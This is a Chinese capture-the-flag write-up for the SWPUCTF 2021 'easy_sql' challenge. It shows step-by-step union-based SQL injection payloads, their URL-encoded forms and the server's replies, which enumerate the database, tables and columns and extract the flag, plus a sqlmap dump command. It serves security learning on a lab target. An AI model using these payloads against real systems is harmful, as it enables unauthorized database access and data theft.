---
title: "[SWPUCTF 2021 新生赛]easy_sql"
date: 2024-07-24
---
---

# easy_sql

**_sql 注入的题目，会做才算入门_**      
F12 查看网页源代码

```html
<title>参数是 wllm</title>
```

get 请求，参数为 wllm
输入`?wllm=1`,返回结果：

```
Your Login name:xxx
Your Password:yyy
```

**burpsuite**抓包，发送到**Repeater**模块进行下一步操作     
因为是 get 传参，所以**注意 URL 编码**，详情见**delete注入.md**

## 确认 sql 注入漏洞

输入一个单引号`?wllm='`,返回结果：

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '''' LIMIT 0,1' at line 1
```

报错啦 🥰，存在 sql 注入漏洞

## order by 确认查询字段数

```sql
# payload         # url编码            # 返回结果

1' order by 4#    1'+order+by+4%23     Unknown column '4' in 'order clause'

1' order by 3#    1'+order+by+3%23     Your Login name:xxx<br>Your Password:yyy
```

字段数为 3

## 寻找注入点

```sql
# payload                 # url编码                  # 返回结果
0' union select 1,2,3#    0'+union+select+1,2,3%23   Your Login name:2<br>Your Password:3
```

2、3 是注入点，尝试使用 union select 命令进行注入

- 这里需要注意**把 1 改成其他数字**，比如 0
- 因为输入只有两个数据，如果为 1，则输出`xxx`、`yyy`，即`Your Login name:xxx<br>Your Password:yyy`，后面的就没有了
- 改成`0`后，数据库找不到数据，`union`前的命令没有输出，而`union`后的我们想要的命令就可以执行输出了

## union select 命令进行注入

### 获取数据库名和表名

```sql
# payload
0' union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()#
# url编码
0'+union+select+1,database(),group_concat(table_name)+from+information_schema.tables+where+table_schema%3ddatabase()%23
# 返回结果
Your Login name:test_db<br>Your Password:test_tb,users
```

拿到数据库名为`test_db`，表名为`test_tb,users`

### 获取列名

```sql
# payload
0' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='test_tb'#
# 返回结果：Your Login name:2<br>Your Password:id,flag
0' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'#
# 返回结果：Your Login name:2<br>Your Password:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password
```

找到`flag`了，在`test_tb`表中

### 获取 flag

```sql
# payload
0' union select 1,2,flag from test_db.test_tb#
# 返回结果：Your Login name:2<br>Your Password:NSSCTF{8f8fe0a0-6e9f-4d5e-ae9c-2b7049afa57b}
```

得到 flag：`NSSCTF{8f8fe0a0-6e9f-4d5e-ae9c-2b7049afa57b}`
# 另一种方法
***sqlmap***秒了
```batch
python sqlmap.py -u http://node4.anna.nssctf.cn:28566//?wllm=1 --columns --dump
```
在`C:\Users\Administrator\AppData\Local\sqlmap\output\node4.anna.nssctf.cn\dump\test_db\test_tb.csv`找到`flag`      
有难度的题目**sqlmap**可能扫不出来      
但还是要养成做题先扫一扫的好习惯        
万一直接出来了呢🤗
